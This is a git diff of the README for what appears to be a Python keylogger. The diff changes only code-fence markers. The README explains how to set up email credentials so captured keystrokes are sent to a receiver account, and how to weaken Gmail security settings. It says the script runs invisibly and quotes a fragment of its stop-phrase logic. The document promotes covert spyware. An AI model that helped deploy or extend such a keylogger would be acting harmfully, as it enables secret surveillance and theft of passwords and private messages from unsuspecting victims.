@@ -13,7 +13,7 @@ If you can't install this stuff you can convert the script into a single .exe fi
 ## Usage
 You have to edit the script to introduce the information to link your email, you have to fill this variables with the requested information
 
-```
+```python
 User = 'Input the sender email account' 
 Receptor = 'Input the receiver email account'
 Password = 'Input the sender email account Password'
@@ -28,7 +28,7 @@ manage your account >> security >>unsafe application access >> yes
 
 The script will be completely invisible except in the application manager<br>
 You can close the script by shutting down the computer or writting down (close keylogger) anywhere and it will stop executing as described in the following lines:
-```
+```python
 elif str(key) == "Key.enter":
         
     if text == ["'c'", "'l'", "'o'", "'s'", "'e'", ' ', "'k'", "'e'", "'y'", "'l'", "'o'", "'g'", "'g'", "'e'", "'r'"]:
